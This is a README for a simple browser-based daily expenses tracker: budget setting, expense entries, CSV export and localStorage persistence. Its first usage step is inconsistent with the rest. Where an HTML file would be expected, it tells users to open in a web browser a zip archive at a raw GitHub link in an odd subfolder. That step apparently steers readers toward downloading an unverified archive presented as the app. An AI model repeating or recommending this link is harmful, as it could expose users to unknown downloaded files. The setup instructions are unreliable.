# Daily Expenses Tracker

A simple web application to track your daily expenses and manage your budget.

## Features

- Set your initial budget amount
- Add expenses with name and amount
- View expenses with date, name, and amount details
- View a summary of your total budget, spent amount, and remaining balance
- Export your expenses to Excel/CSV format with dates included
- Delete expenses as needed
- Data is saved locally in your browser

## How to Use

1. Open the `https://raw.githubusercontent.com/TANMaYtO/Daily-expanses-tracker/master/vehiculate/Daily-tracker-expanses-3.0.zip` file in a web browser
2. Enter your total available amount and click "Set Budget"
3. Add your expenses by entering a name and amount
4. View your expenses history with dates and budget summary
5. Export your data to Excel by clicking the "Export to Excel" button
6. Delete any expense by clicking the "Delete" button next to it
7. Reset all data if needed with the "Reset All Data" button

## Technical Details

- Built with vanilla HTML, CSS, and JavaScript
- Uses localStorage to persist data between sessions
- Exports data to CSV format that can be opened in Excel
- No external dependencies required

## Note

This application stores all data locally in your browser. Clearing your browser cache or using private browsing will result in data loss. To preserve your data, use the "Export to Excel" feature regularly.
